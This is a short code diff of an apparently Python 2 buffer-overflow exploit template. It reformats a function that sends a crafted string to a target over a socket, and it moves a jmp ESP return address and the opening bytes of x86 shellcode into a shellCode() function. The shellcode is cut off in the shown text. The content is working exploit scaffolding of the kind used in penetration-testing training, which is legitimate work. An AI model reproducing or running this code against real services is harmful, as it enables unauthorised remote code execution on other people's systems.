@@ -25,7 +25,7 @@ def totalBytes():
         	connect=s.connect((server ,port))
         	#s.recv(1024)
         	s.send('' + string + '\r\n') #modify per PoC code
-                s.recv(1024)
+		s.recv(1024)
         	s.close()
 
 def requiredBytes():
@@ -152,13 +152,13 @@ def findSpace():
 def shellCode():
 	print "Modify this script. We need the jmp ESP address"
 	print "Modify this Script. We need the shellcode"
-
-#jmpesp examples
-'''
-jmpesp = 5F4A358F
-little endian value = '\x8f\x35\x4a\x5f'
-'''
-#	jmpesp = '\x01\x1d\xd1\x65'
+	#jmpesp examples
+	'''
+	jmpesp = 5F4A358F
+	little endian value = '\x8f\x35\x4a\x5f'
+	'''
+	
+	jmpesp = '\x01\x1d\xd1\x65' # change this
 	shellcode=("\xb8\x69\xd6\xd1\xfe\xd9\xc5\xd9\x74\x24\xf4\x5e\x31"
 	"\xc9\xb1\x52\x31\x46\x12\x03\x46\x12\x83\x87\x2a\x33"
 	"\x0b\xab\x3b\x36\xf4\x53\xbc\x57\x7c\xb6\x8d\x57\x1a"
